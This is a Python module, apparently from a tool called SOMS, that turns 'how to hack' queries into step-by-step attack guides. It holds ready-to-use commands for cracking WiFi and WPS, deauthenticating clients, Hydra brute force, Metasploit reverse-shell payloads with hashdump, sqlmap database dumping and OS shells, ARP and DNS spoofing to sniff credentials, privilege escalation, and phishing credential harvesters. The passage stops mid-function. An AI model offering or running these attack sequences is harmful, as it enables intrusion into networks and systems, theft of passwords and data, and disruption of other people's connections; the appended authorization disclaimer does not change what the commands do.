"""Demonstrator Module for SOMS
Provides step-by-step walkthrough demonstrations for hacking and educational topics.
"""

import time
import logging

logger = logging.getLogger('Demonstrator')


class Step:
    """Represents a single step in a demonstration."""

    def __init__(self, title, description, command=None, note=None, warning=None):
        self.title = title
        self.description = description
        self.command = command
        self.note = note
        self.warning = warning

    def format(self):
        lines = [f"STEP: {self.title}", f"  {self.description}"]
        if self.command:
            lines.append(f"  CMD: {self.command}")
        if self.note:
            lines.append(f"  NOTE: {self.note}")
        if self.warning:
            lines.append(f"  WARNING: {self.warning}")
        return '\n'.join(lines)


class Demonstrator:
    """Step-by-step demonstration engine for hacking and educational topics."""

    def __init__(self, system_ref=None):
        self.system = system_ref
        self._demos = {}
        self._register_demos()

    def _register_demos(self):
        """Register all available demonstration topics."""
        self._demos = {
            'wifi': self._demo_wifi_hack,
            'wep': self._demo_wep_crack,
            'wpa': self._demo_wpa_crack,
            'wps': self._demo_wps_attack,
            'pmkid': self._demo_pmkid_attack,
            'nmap': self._demo_nmap_scan,
            'aircrack': self._demo_aircrack,
            'reaver': self._demo_reaver,
            'hashcat': self._demo_hashcat,
            'john': self._demo_john,
            'hydra': self._demo_hydra,
            'metasploit': self._demo_metasploit,
            'sqlmap': self._demo_sqlmap,
            'nikto': self._demo_nikto,
            'burp': self._demo_burp,
            'ettercap': self._demo_ettercap,
            'bettercap': self._demo_bettercap,
            'mitmproxy': self._demo_mitmproxy,
            'malware': self._demo_malware_analysis,
            'forensics': self._demo_forensics,
            'reverse': self._demo_reverse_engineering,
            'linux': self._demo_linux_privesc,
            'windows': self._demo_windows_privesc,
            'phishing': self._demo_phishing_awareness,
            'social': self._demo_social_engineering,
            'password': self._demo_password_crack,
            'brute': self._demo_brute_force,
            'sniff': self._demo_packet_sniffing,
            'wireless': self._demo_wireless_audit,
        }

    def detect_topic(self, query):
        """Detect if a query is a 'how to' demo request. Returns topic key or None."""
        q = query.lower().strip()
        if not q:
            return None

        how_to_patterns = [
            'how to hack', 'how do i hack', 'show me how to hack',
            'demonstrate', 'walk me through', 'step by step',
            'tutorial', 'guide me', 'show me the steps',
            'explain how to', 'teach me how to', 'how can i hack',
            'give me a demo', 'show demo', 'demonstration of',
            'how to crack', 'crack wifi', 'crack password',
            'hack wifi', 'hack network', 'hack system',
            'break into', 'penetrate', 'exploit',
        ]

        is_how_to = any(p in q for p in how_to_patterns)
        if not is_how_to:
            return None

        topic_map = {
            'wifi': ['wifi', 'wi-fi', 'wireless network', 'wlan', 'access point'],
            'wep': ['wep encryption', 'crack wep'],
            'wpa': ['wpa', 'wpa2', 'wpa3'],
            'wps': ['wps', 'pixie dust', 'pixiedust'],
            'pmkid': ['pmkid'],
            'nmap': ['nmap', 'port scan', 'portscan', 'network scan', 'scan network'],
            'aircrack': ['aircrack', 'airmon', 'airodump', 'aireplay'],
            'reaver': ['reaver', 'bully wps'],
            'hashcat': ['hashcat', 'hash crack'],
            'john': ['john the ripper', 'john ripper'],
            'hydra': ['hydra', 'brute force login', 'brute-force login', 'bruteforce login'],
            'metasploit': ['metasploit', 'msfconsole', 'msf '],
            'sqlmap': ['sqlmap', 'sql injection', 'sqli'],
            'nikto': ['nikto', 'web scan', 'web vuln'],
            'burp': ['burp', 'burpsuite', 'burp suite'],
            'ettercap': ['ettercap', 'arp spoof', 'arpspoof'],
            'bettercap': ['bettercap'],
            'mitmproxy': ['mitmproxy', 'mitm proxy', 'man in the middle'],
            'malware': ['malware', 'virus', 'trojan', 'ransomware', 'backdoor'],
            'forensics': ['forensic', 'forensics', 'disk image', 'evidence'],
            'reverse': ['reverse engineer', 'reverse engineering', 'disassembl', 'decompil'],
            'linux': ['linux system', 'linux privilege escalation', 'linux privesc', 'root on linux', 'sudo exploit', 'privilege escalation on linux', 'hack linux', 'linux box'],
            'windows': ['windows system', 'windows privilege escalation', 'windows privesc', 'admin on windows', 'hack windows', 'windows box'],
            'phishing': ['phishing', 'phish '],
            'social': ['social engineering', 'social engineer'],
            'password': ['password', 'crack password', 'cracking password', 'password hash'],
            'brute': ['brute force attack', 'dictionary attack', 'brute force password'],
            'sniff': ['sniff', 'packet capture', 'tcpdump', 'wireshark'],
            'wireless': ['wireless audit', 'wireless hacking', 'wifi audit'],
        }

        for topic, keywords in topic_map.items():
            if any(k in q for k in keywords):
                return topic

        return 'wifi' if is_how_to else None

    def get_demo_steps(self, topic):
        """Get the step-by-step demonstration for a topic."""
        demo_fn = self._demos.get(topic)
        if not demo_fn:
            return self._demo_generic(topic)
        return demo_fn()

    def run_demo(self, topic, progress_callback=None):
        """Run a demo with progress callbacks for GUI display. Returns full guide text."""
        steps = self.get_demo_steps(topic)
        guide_lines = []
        guide_lines.append(f"{'='*50}")
        guide_lines.append(f"DEMONSTRATION: {topic.upper().replace('_', ' ')} HACKING")
        guide_lines.append(f"{'='*50}")
        guide_lines.append("")

        total = len(steps)
        for i, step in enumerate(steps):
            if progress_callback:
                progress_callback(f"Step {i+1}/{total}: {step.title}")
            guide_lines.append(f"--- Step {i+1}/{total}: {step.title} ---")
            guide_lines.append(step.description)
            if step.command:
                guide_lines.append(f"  Command: {step.command}")
            if step.note:
                guide_lines.append(f"  Note: {step.note}")
            if step.warning:
                guide_lines.append(f"  WARNING: {step.warning}")
            guide_lines.append("")

            time.sleep(0.15)

        guide_lines.append(f"{'='*50}")
        guide_lines.append("END OF DEMONSTRATION")
        guide_lines.append(f"{'='*50}")
        guide_lines.append("")
        guide_lines.append("IMPORTANT: Only use these techniques on systems you own or have explicit written authorization to test. Unauthorized access is illegal.")

        if progress_callback:
            progress_callback("Demo complete")

        return '\n'.join(guide_lines)

    def get_available_topics(self):
        """Return list of available demo topics."""
        return sorted(self._demos.keys())

    # ============================================================
    # WIFI HACKING DEMONSTRATIONS
    # ============================================================

    def _demo_wifi_hack(self):
        return [
            Step("Check Wireless Adapter",
                 "First, verify your wireless adapter supports monitor mode.",
                 command="iwconfig",
                 note="Look for wlan0 or similar wireless interface."),
            Step("Enable Monitor Mode",
                 "Put your wireless interface into monitor mode to capture all traffic.",
                 command="sudo airmon-ng check kill && sudo airmon-ng start wlan0",
                 note="This will create a new interface like wlan0mon. Kill network managers first."),
            Step("Scan for Networks",
                 "Scan all nearby wireless networks to identify targets.",
                 command="sudo airodump-ng wlan0mon",
                 note="Note the BSSID (MAC), Channel, and Encryption type of your target."),
            Step("Lock onto Target Channel",
                 "Focus on the target network's specific channel to capture its traffic.",
                 command="sudo airodump-ng --channel [CHANNEL] --bssid [TARGET_BSSID] --write capture wlan0mon",
                 note="Replace [CHANNEL] and [TARGET_BSSID] with actual values from Step 3."),
            Step("Capture Handshake",
                 "Wait for a client to connect, or force a deauthentication to capture the WPA handshake.",
                 command="sudo aireplay-ng --deauth 10 -a [TARGET_BSSID] wlan0mon",
                 warning="Deauth attacks disconnect all clients. Only use on your own network!",
                 note="Look for 'WPA handshake: XX:XX:XX:XX:XX:XX' in airodump-ng output."),
            Step("Crack the Password",
                 "Use aircrack-ng with a wordlist to crack the captured handshake.",
                 command="sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap",
                 note="If rockyou.txt is not available: sudo apt install wordlists && sudo gunzip /usr/share/wordlists/rockyou.txt.gz"),
            Step("Verify Access",
                 "Once cracked, connect to the network with the recovered password.",
                 command="nmcli dev wifi connect [SSID] password [PASSWORD]",
                 note="Replace [SSID] and [PASSWORD] with the network name and cracked password."),
        ]

    def _demo_wep_crack(self):
        return [
            Step("Enable Monitor Mode",
                 "Put interface into monitor mode.",
                 command="sudo airmon-ng start wlan0"),
            Step("Capture IVs",
                 "Target the WEP network and capture initialization vectors.",
                 command="sudo airodump-ng --channel [CHANNEL] --bssid [BSSID] --write wep_capture wlan0mon",
                 note="Wait until you have 20,000+ IVs (look for #Data column)."),
            Step("Inject Traffic",
                 "Use aireplay to generate more traffic and IVs faster.",
                 command="sudo aireplay-ng -3 -b [BSSID] wlan0mon",
                 note="Fake authentication may be needed first: aireplay-ng -1 0 -a [BSSID] wlan0mon"),
            Step("Crack WEP Key",
                 "Use aircrack-ng to recover the WEP key from captured IVs.",
                 command="sudo aircrack-ng wep_capture-01.cap",
                 note="WEP can be cracked with as few as 40,000 IVs."),
        ]

    def _demo_wpa_crack(self):
        return [
            Step("Enable Monitor Mode",
                 "Put interface into monitor mode.",
                 command="sudo airmon-ng check kill && sudo airmon-ng start wlan0"),
            Step("Capture WPA Handshake",
                 "Target the WPA/WPA2 network and capture the 4-way handshake.",
                 command="sudo airodump-ng --channel [CHANNEL] --bssid [BSSID] --write wpa_capture wlan0mon",
                 note="Deauth clients if needed: aireplay-ng --deauth 5 -a [BSSID] wlan0mon"),
            Step("Verify Handshake",
                 "Confirm the handshake was captured successfully.",
                 command="sudo aircrack-ng wpa_capture-01.cap",
                 note="If no handshake found, repeat Step 2."),
            Step("Wordlist Attack",
                 "Crack the handshake with a comprehensive wordlist.",
                 command="sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] wpa_capture-01.cap",
                 note="For faster cracking: sudo hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt"),
            Step("Rule-Based Attack",
                 "If dictionary fails, apply mangling rules for complex passwords.",
                 command="sudo hashcat -m 22000 -r /usr/share/hashcat/rules/best64.rule hash.hc22000 /usr/share/wordlists/rockyou.txt",
                 note="Rules append/prepend/modifiy words in the wordlist."),
        ]

    def _demo_wps_attack(self):
        return [
            Step("Enable Monitor Mode",
                 "Put interface into monitor mode.",
                 command="sudo airmon-ng start wlan0"),
            Step("Scan for WPS Networks",
                 "Find networks with WPS enabled.",
                 command="sudo wash -i wlan0mon",
                 note="WPS networks will show with WPS column = 2.0 or higher."),
            Step("Pixie Dust Attack",
                 "Attempt the offline Pixie Dust attack (fast, works on vulnerable routers).",
                 command="sudo reaver -i wlan0mon -b [BSSID] -c [CHANNEL] -K 1 -vv",
                 note="If Pixie Dust fails, try PIN brute force in Step 4."),
            Step("WPS PIN Brute Force",
                 "Brute force the 8-digit WPS PIN (can take hours).",
                 command="sudo reaver -i wlan0mon -b [BSSID] -c [CHANNEL] -p [PIN] -vv",
                 note="Common PINs: 12345678, 00000000, 87654321"),
            Step("Alternative: Use Bully",
                 "Bully is an alternative WPS tool with different attack strategies.",
                 command="sudo bully -b [BSSID] -c [CHANNEL] -d -v 3 wlan0mon",
                 note="Bully sometimes succeeds where reaver fails."),
        ]

    def _demo_pmkid_attack(self):
        return [
            Step("Ensure Interface Supports PMKID",
                 "PMKID attack requires a compatible adapter and hcxdumptool.",
                 command="sudo apt install hcxdumptool hashcat",
                 note="PMKID captures a single handshake without needing a client to connect."),
            Step("Capture PMKID",
                 "Use hcxdumptool to capture the PMKID directly from the AP.",
                 command="sudo hcxdumptool -i wlan0mon --filterlist_ap=[BSSID] --filtermode=2 -o pmkid.pcapng",
                 note="This takes 1-5 minutes. The AP sends the PMKID in the first EAPOL frame."),
            Step("Convert PMKID to Hash",
                 "Convert the pcapng to hashcat format.",
                 command="hcxpcapngtool -o hash.hc22000 pmkid.pcapng",
                 note="The output file contains the hash in hc22000 format."),
            Step("Crack with Hashcat",
                 "Use hashcat to crack the PMKID hash offline.",
                 command="sudo hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt",
                 note="PMKID attack is silent — no deauth required, less likely to be detected."),
        ]

    # ============================================================
    # NETWORK / SCANNING DEMONSTRATIONS
    # ============================================================

    def _demo_nmap_scan(self):
        return [
            Step("Quick Discovery Scan",
                 "Find all live hosts on the local network quickly.",
                 command="nmap -sn 192.168.1.0/24",
                 note="Replace 192.168.1.0/24 with your actual subnet."),
            Step("Service Version Detection",
                 "Identify running services and their versions on target hosts.",
                 command="nmap -sV -sC [TARGET_IP]",
                 note="-sV detects service versions, -sC runs default scripts."),
            Step("Full Port Scan",
                 "Scan all 65535 TCP ports for open services.",
                 command="nmap -p- [TARGET_IP] --open",
                 note="This can take several minutes. --open shows only open ports."),
            Step("OS Fingerprinting",
                 "Detect the target's operating system.",
                 command="nmap -O [TARGET_IP]",
                 note="Requires root privileges for OS detection."),
            Step("Vulnerability Scan",
                 "Use Nmap scripts to find known vulnerabilities.",
                 command="nmap --script vuln [TARGET_IP]",
                 note="NSE scripts check for hundreds of known CVEs."),
            Step("Stealth Scan",
                 "Perform a SYN stealth scan to avoid basic logging.",
                 command="nmap -sS -T2 [TARGET_IP]",
                 note="-sS sends SYN packets (half-open). -T2 is slow and stealthy."),
        ]

    def _demo_wireless_audit(self):
        return [
            Step("Check Wireless Adapter",
                 "Verify your adapter and install required tools.",
                 command="iwconfig && sudo apt install aircrack-ng reaver wash",
                 note="You need a wireless adapter that supports monitor mode."),
            Step("Enable Monitor Mode",
                 "Switch to monitor mode.",
                 command="sudo airmon-ng check kill && sudo airmon-ng start wlan0"),
            Step("Full Network Scan",
                 "Scan all networks with detailed info.",
                 command="sudo airodump-ng wlan0mon",
                 note="Note BSSID, Channel, Encryption, and Clients for each network."),
            Step("Identify Vulnerable Networks",
                 "Look for weak encryption (WEP, WPS enabled, short passwords).",
                 note="WEP = easy. WPS = Pixie Dust possible. WPA2 = needs wordlist."),
            Step("Target Selection",
                 "Choose the most vulnerable target based on encryption and signal strength.",
                 note="Prefer networks with WPS enabled, strong signal, or known weak passwords."),
            Step("Execute Attack",
                 "Run the appropriate attack based on encryption type.",
                 note="WEP: aircrack-ng. WPA: handshake capture. WPS: reaver/bully."),
        ]

    # ============================================================
    # TOOL-SPECIFIC DEMONSTRATIONS
    # ============================================================

    def _demo_aircrack(self):
        return [
            Step("Install Aircrack-ng",
                 "Ensure the aircrack-ng suite is installed.",
                 command="sudo apt install aircrack-ng"),
            Step("Interface Setup",
                 "Put your wireless card into monitor mode.",
                 command="sudo airmon-ng check kill && sudo airmon-ng start wlan0"),
            Step("Capture Traffic",
                 "Use airodump-ng to capture WPA handshakes or WEP IVs.",
                 command="sudo airodump-ng --write capture wlan0mon"),
            Step("Crack with Aircrack-ng",
                 "Run the cracking process against captured data.",
                 command="sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap",
                 note="Use -b [BSSID] to target a specific network."),
        ]

    def _demo_reaver(self):
        return [
            Step("Install Reaver",
                 "Install reaver for WPS PIN attacks.",
                 command="sudo apt install reaver"),
            Step("Enable Monitor Mode",
                 "Switch interface to monitor mode.",
                 command="sudo airmon-ng start wlan0"),
            Step("Scan for WPS Networks",
                 "Find networks with WPS enabled.",
                 command="sudo wash -i wlan0mon"),
            Step("Run Reaver",
                 "Attack the WPS PIN on the target network.",
                 command="sudo reaver -i wlan0mon -b [BSSID] -c [CHANNEL] -vv",
                 note="Average PIN brute force takes 4-10 hours depending on target."),
        ]

    def _demo_hashcat(self):
        return [
            Step("Install Hashcat",
                 "Install hashcat for GPU-accelerated password cracking.",
                 command="sudo apt install hashcat"),
            Step("Identify Hash Type",
                 "Determine the hash type you need to crack.",
                 command="hashcat --example-hashes | grep -A1 'WPA'",
                 note="Common modes: 22000 (WPA-PBKDF2-PMKID+EAPOL), 1000 (NTLM), 0 (MD5)."),
            Step("Prepare Hash File",
                 "Create or convert the hash file to hashcat format.",
                 command="hcxpcapngtool -o hash.hc22000 capture.pcapng",
                 note="Use the appropriate tool to extract hashes from your source."),
            Step("Crack the Hash",
                 "Run hashcat against the hash file with a wordlist.",
                 command="sudo hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt",
                 note="Use -a 3 for brute force: hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a"),
            Step("View Results",
                 "Check cracked passwords.",
                 command="sudo hashcat -m 22000 hash.hc22000 --show",
                 note="Cracked hashes are stored in hashcat.potfile."),
        ]

    def _demo_john(self):
        return [
            Step("Install John the Ripper",
                 "Install john for password hash cracking.",
                 command="sudo apt install john"),
            Step("Identify Hash Format",
                 "Determine the hash format.",
                 command="john --list=formats | grep -i wp",
                 note="John supports hundreds of hash formats."),
            Step("Create Hash File",
                 "Put the target hashes into a text file (one hash per line).",
                 command="echo '[HASH]' > hashes.txt"),
            Step("Run John",
                 "Start the cracking process.",
                 command="john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
                 note="John auto-detects hash type. Use --format= to specify."),
            Step("Show Results",
                 "Display cracked passwords.",
                 command="john --show hashes.txt",
                 note="John also tries incremental mode (brute force) by default."),
        ]

    def _demo_hydra(self):
        return [
            Step("Install Hydra",
                 "Install THC Hydra for online brute force attacks.",
                 command="sudo apt install hydra"),
            Step("Identify Target Service",
                 "Determine what service to attack (SSH, HTTP, FTP, etc.).",
                 command="nmap -sV -p 22,80,21,443 [TARGET_IP]",
                 note="Check which services are actually running."),
            Step("Prepare Credentials",
                 "Create username and password lists.",
                 command="echo -e 'admin\nroot\nuser' > users.txt && echo -e 'password\n123456\nadmin' > passwords.txt",
                 note="Use larger wordlists for real attacks."),
            Step("Launch Brute Force",
                 "Run Hydra against the target service.",
                 command="hydra -L users.txt -P passwords.txt [TARGET_IP] ssh -t 4 -vV",
                 note="-t 4 = 4 threads. -vV = verbose output. Add -f to stop on first match."),
            Step("Try Common Passwords",
                 "Try the most common passwords first for speed.",
                 command="hydra -l admin -P /usr/share/wordlists/rockyou.txt [TARGET_IP] http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'",
                 note="http-post-form requires the login URL, username field, password field, and failure string."),
        ]

    def _demo_metasploit(self):
        return [
            Step("Start Metasploit",
                 "Launch the Metasploit console.",
                 command="sudo msfconsole",
                 note="Metasploit requires PostgreSQL database running."),
            Step("Search for Exploits",
                 "Find relevant exploits for your target.",
                 command="search [SERVICE_VERSION]",
                 note="Example: search apache 2.4, search windows smb, search eternalblue"),
            Step("Select and Configure Exploit",
                 "Choose an exploit and set its options.",
                 command="use [EXPLOIT_PATH]\nshow options\nset RHOSTS [TARGET_IP]\nset LHOST [YOUR_IP]",
                 note="Always set RHOSTS (target) and LHOST (your IP for callbacks)."),
            Step("Configure Payload",
                 "Set the payload for remote access after exploitation.",
                 command="set PAYLOAD python/meterpreter/reverse_tcp\nshow payloads",
                 note="Meterpreter is the most feature-rich payload for post-exploitation."),
            Step("Execute Attack",
                 "Run the exploit and wait for a session.",
                 command="exploit",
                 note="If successful, you'll get a Meterpreter session. Use 'help' for post-exploitation commands."),
            Step("Post-Exploitation",
                 "Once in, gather information and maintain access.",
                 command="sysinfo\ngetuid\nhashdump\nscreenshot\nshell",
                 note="Key Meterpreter commands: sysinfo, getuid, hashdump, screenshot, shell, persistence."),
        ]

    def _demo_sqlmap(self):
        return [
            Step("Install sqlmap",
                 "Install the SQL injection testing tool.",
                 command="sudo apt install sqlmap"),
            Step("Identify Injection Point",
                 "Find a URL with a parameter that might be vulnerable.",
                 note="Look for URLs with ?id=1, ?user=test, ?page=2, etc."),
            Step("Test for SQL Injection",
                 "Run sqlmap against the target URL.",
                 command="sqlmap -u 'http://target.com/page?id=1' --dbs --batch",
                 note="--batch runs non-interactively with default answers."),
            Step("Enumerate Databases",
                 "List all databases on the server.",
                 command="sqlmap -u 'http://target.com/page?id=1' --dbs",
                 note="Look for interesting database names (users, admin, wordpress)."),
            Step("Extract Data",
                 "Dump tables from the target database.",
                 command="sqlmap -u 'http://target.com/page?id=1' -D [DATABASE] -T [TABLE] --dump",
                 note="Use --dump-all cautiously — it can be slow on large databases."),
            Step("OS Shell",
                 "Attempt to get a system shell via SQL injection.",
                 command="sqlmap -u 'http://target.com/page?id=1' --os-shell",
                 note="Works on MySQL with FILE privilege or certain SQL Server configs."),
        ]

    def _demo_nikto(self):
        return [
            Step("Install Nikto",
                 "Install the web server scanner.",
                 command="sudo apt install nikto"),
            Step("Basic Scan",
                 "Run a default scan against the target web server.",
                 command="nikto -h http://[TARGET_IP]",
                 note="Nikto checks for over 6700 potentially dangerous files/programs."),
            Step("SSL Scan",
                 "Scan HTTPS sites with SSL checking.",
                 command="nikto -h https://[TARGET_IP] -ssl",
                 note="Checks for SSL/TLS misconfigurations and weak ciphers."),
            Step("Tuning Options",
                 "Use tuning options for specific vulnerability categories.",
                 command="nikto -h [TARGET] -Tuning 123b",
                 note="Tuning: 1=Interesting File, 2=Misconfig, 3=Information Disclosure, b=Interesting File/404."),
        ]

    def _demo_burp(self):
        return [
            Step("Launch Burp Suite",
                 "Start Burp Suite and configure your browser proxy.",
                 note="Set browser proxy to 127.0.0.1:8080. Install Burp's CA certificate for HTTPS."),
            Step("Spider the Target",
                 "Use Burp Spider to crawl the target application.",
                 note="Right-click target in Target tab > Spider this host."),
            Step("Active Scanning",
                 "Run Burp Scanner against discovered content.",
                 note="Select targets in Target tab > Right-click > Actively scan this host."),
            Step("Manual Testing",
                 "Use Repeater to manually test injection points.",
                 note="Send requests to Repeater (Ctrl+R) and modify parameters to test for SQLi, XSS, etc."),
            Step("Intruder Attacks",
                 "Use Intruder for automated parameter fuzzing.",
                 note="Set payload positions with § markers. Choose Sniper, Battering Ram, or Pitchfork."),
        ]

    def _demo_ettercap(self):
        return [
            Step("Install Ettercap",
                 "Install the MITM attack framework.",
                 command="sudo apt install ettercap-graphical"),
             Step("Configure Interface",
                 "Set your network interface for sniffing.",
                 command="sudo ettercap -G",
                 note="Go to Sniff > Unified sniffing and select your interface."),
            Step("Scan for Hosts",
                 "Discover hosts on the network.",
                 note="Hosts > Scan for hosts. Then Hosts > Host list to view targets."),
            Step("Set MITM Targets",
                 "Configure ARP poisoning between gateway and victim.",
                 note="Mitm > ARP poisoning > Sniff remote connections. Select targets."),
            Step("Start Sniffing",
                 "Begin capturing credentials and traffic.",
                 note="Start > Start sniffing. View captured data in plugins and target tabs."),
            Step("ARP Poisoning",
                 "Redirect traffic through your machine.",
                 command="sudo ettercap -T -i eth0 -M arp /192.168.1.1// /192.168.1.100//",
                 note="Replace IPs with your gateway and target."),
        ]

    def _demo_bettercap(self):
        return [
            Step("Install Bettercap",
                 "Install the modern MITM framework.",
                 command="sudo apt install bettercap",
                 note="Or: sudo snap install bettercap"),
            Step("Start Bettercap",
                 "Launch the interactive shell.",
                 command="sudo bettercap -iface wlan0"),
            Step("Network Recon",
                 "Discover hosts and services on the network.",
                 command="net.probe on\nnet.show",
                 note="net.probe discovers hosts. net.show lists them."),
            Step("ARP Spoofing",
                 "Perform ARP spoofing to intercept traffic.",
                 command="set arp.spoof.targets [VICTIM_IP]\narp.spoof on",
                 note="This redirects the victim's traffic through your machine."),
            Step("Sniff Credentials",
                 "Capture HTTP/HTTPS credentials in real time.",
                 command="set net.sniff.verbose true\nnet.sniff on",
                 note="Bettercap automatically extracts HTTP basic auth, cookies, and POST data."),
            Step("DNS Spoofing",
                 "Redirect DNS queries to your chosen IP.",
                 command="set dns.spoof.domains [DOMAIN]\nset dns.spoof.address [YOUR_IP]\ndns.spoof on",
                 note="Useful for phishing demonstrations within your own network."),
        ]

    def _demo_mitmproxy(self):
        return [
            Step("Install mitmproxy",
                 "Install the HTTPS interception proxy.",
                 command="sudo apt install mitmproxy",
                 note="Or: pip install mitmproxy"),
            Step("Start mitmproxy",
                 "Launch the interactive proxy interface.",
                 command="mitmproxy",
                 note="Set browser proxy to 127.0.0.1:8080 and install the CA cert."),
            Step("Capture Traffic",
                 "All HTTP/HTTPS requests will appear in the interface.",
                 note="Use arrow keys to navigate. Enter to view request details."),
            Step("Modify Requests",
                 "Intercept and modify requests on the fly.",
                 note="Press 'i' to set intercept filter. Press 'e' to edit intercepted requests."),
            Step("Write Addons",
                 "Create Python scripts for custom proxy logic.",
                 command="mitmproxy -s addon.py",
                 note="Addons can modify requests, responses, and automate attacks."),
        ]

    # ============================================================
    # SECURITY / REVERSE ENGINEERING
    # ============================================================

    def _demo_malware_analysis(self):
        return [
            Step("Set Up Isolated Environment",
                 "Create a safe analysis environment (VM, no network).",
                 note="Use VirtualBox/VMware with host-only networking. Take a snapshot before analysis."),
            Step("Static Analysis",
                 "Examine the malware without executing it.",
                 command="file malware.exe\nstrings malware.exe | head -50\nxxd malware.exe | head -20",
                 note="Check file type, strings for URLs/IPs, and hex headers for packers."),
            Step("Check Hashes",
                 "Look up file hashes on VirusTotal.",
                 command="sha256sum malware.exe\nmd5sum malware.exe",
                 note="Search hashes at virustotal.com to see if it's already known malware."),
            Step("Dynamic Analysis",
                 "Run the malware in a sandbox and observe behavior.",
                 command="strace ./malware\nltrace ./malware",
                 note="Monitor file system, network, and process activity."),
            Step("Network Analysis",
                 "Capture network traffic during execution.",
                 command="tcpdump -i eth0 -w malware_traffic.pcap",
                 note="Look for C2 servers, DNS queries, and exfiltrated data."),
            Step("YARA Rules",
                 "Create detection rules for the malware.",
                 command="yara -r rules.yar malware.exe",
                 note="Write YARA rules to detect similar malware in the future."),
        ]

    def _demo_forensics(self):
        return [
            Step("Acquire Disk Image",
                 "Create a forensic image of the target drive.",
                 command="sudo dd if=/dev/sdX of=disk.img bs=4M status=progress",
                 note="Always work on a copy, never the original evidence."),
            Step("Mount Read-Only",
                 "Mount the image safely for examination.",
                 command="sudo mkdir /mnt/evidence && sudo mount -o ro,loop disk.img /mnt/evidence",
                 note="Using loop device and read-only mount preserves evidence integrity."),
            Step("File System Analysis",
                 "List all files and recover deleted ones.",
                 command="fls -r disk.img\nicat disk.img [INODE] > recovered_file",
                 note="Use The Sleuth Kit (TSK) for filesystem forensics."),
            Step("Timeline Analysis",
                 "Create a timeline of file system events.",
                 command="fls -r -m '/' disk.img | mactime -b - -d > timeline.csv",
                 note="Timeline shows when files were created, modified, and accessed."),
            Step("Memory Forensics",
                 "Analyze memory dumps for running processes and artifacts.",
                 command="volatility -f memdump.raw --profile=[PROFILE] pslist",
                 note="Use Volatility for memory analysis. Find profiles with imageinfo."),
        ]

    def _demo_reverse_engineering(self):
        return [
            Step("Initial Analysis",
                 "Determine file type and basic properties.",
                 command="file binary\nreadelf -h binary\nstrings binary | head -30",
                 note="Check if it's ELF, PE, or other format. Look for embedded strings."),
            Step("Disassemble with objdump",
                 "Get a disassembly view of the binary.",
                 command="objdump -d binary | head -100",
                 note="For full disassembly: objdump -d binary > disassembly.txt"),
            Step("Use GDB for Dynamic Analysis",
                 "Debug and trace the binary at runtime.",
                 command="gdb ./binary\n(gdb) break main\n(gdb) run\n(gdb) stepi\n(gdb) info registers",
                 note="GDB is the standard Linux debugger. Use for step-by-step execution."),
            Step("Use Ghidra",
                 "Load into Ghidra for decompilation.",
                 command="ghidraRun",
                 note="Ghidra (by NSA) provides decompilation to C-like pseudocode."),
            Step("Analyze API Calls",
                 "Identify system calls and library functions used.",
                 command="ltrace ./binary\nstrace ./binary",
                 note="ltrace shows library calls, strace shows system calls."),
        ]

    # ============================================================
    # PRIVILEGE ESCALATION
    # ============================================================

    def _demo_linux_privesc(self):
        return [
            Step("Enumerate System",
                 "Gather basic system information.",
                 command="id\nuname -a\ncat /etc/os-release\ncat /etc/passwd",
                 note="Check your user, kernel version, and OS."),
            Step("Find SUID Binaries",
                 "Look for SUID/SGID binaries that can be abused.",
                 command="find / -perm -4000 -type f 2>/dev/null",
                 note="Common exploitable: nmap, vim, find, bash, python, wget, curl."),
            Step("Check Sudo Permissions",
                 "See what commands you can run as root.",
                 command="sudo -l",
                 note="Look for NOPASSWD entries or specific commands you can run."),
            Step("Check for Misconfigurations",
                 "Look for writable files, cron jobs, and kernel exploits.",
                 command="find / -writable -type f 2>/dev/null\ncrontab -l\nls -la /etc/cron*",
                 note="Writable cron scripts or config files can be modified for root access."),
            Step("Kernel Exploit",
                 "If kernel is old, search for known exploits.",
                 command="searchsploit linux kernel [VERSION]",
                 note="Use searchsploit from exploit-db to find kernel exploits."),
            Step("Exploit and Escalate",
                 "Use the found vulnerability to get root.",
                 command="sudo [EXPLOITABLE_BINARY] -c '/bin/bash'",
                 note="Example: sudo find / -exec /bin/bash \\; or sudo python -c 'import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")'"),
        ]

    def _demo_windows_privesc(self):
        return [
            Step("Enumerate User",
                 "Check current user and groups.",
                 command="whoami /all",
                 note="Look for special privileges (SeImpersonatePrivilege, SeBackupPrivilege)."),
            Step("System Information",
                 "Gather OS and patch information.",
                 command="systeminfo\nhostname\nnet user",
                 note="Note the OS version and installed hotfixes."),
            Step("Check Services",
                 "Find services with unquoted paths or writable binaries.",
                 command="wmic service list brief\nsc query",
                 note="Unquoted paths with spaces can be hijacked for privilege escalation."),
            Step("Check Autoruns",
                 "Look for writable autorun executables.",
                 command="reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                 note="If the autorun binary path is writable, replace it with your payload."),
            Step("Use PowerUp",
                 "Run PowerUp from PowerShell Empire for automated checks.",
                 command="powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"",
                 note="PowerUp automates most common Windows privilege escalation checks."),
            Step("Metasploit Escalation",
                 "Use Meterpreter's getsystem for automatic escalation.",
                 command="getsystem",
                 note="Meterpreter tries multiple techniques (named pipe impersonation, etc.)."),
        ]

    # ============================================================
    # OTHER TOPICS
    # ============================================================

    def _demo_phishing_awareness(self):
        return [
            Step("Set Up Phishing Infrastructure",
                 "Clone a login page and configure a lookalike domain.",
                 note="Use SET (Social Engineering Toolkit): sudo setoolkit"),
            Step("Email Crafting",
                 "Create a convincing phishing email.",
                 note="Match the target's email format. Use urgency and authority cues."),
            Step("Credential Harvesting",
                 "Configure a web server to capture submitted credentials.",
                 command="setoolkit > 1) Social-Engineering > 2) Website Attack Vectors > 3) Credential Harvester",
                 note="SET can clone real login pages automatically."),
            Step("Delivery",
                 "Send the phishing email with the malicious link.",
                 note="Use URL shorteners and track opens/clicks."),
            Step("Defense",
                 "Implement protections against phishing.",
                 note="Enable MFA, train users, deploy email filtering, use DMARC/DKIM/SPF."),
        ]

    def _demo_social_engineering(self):
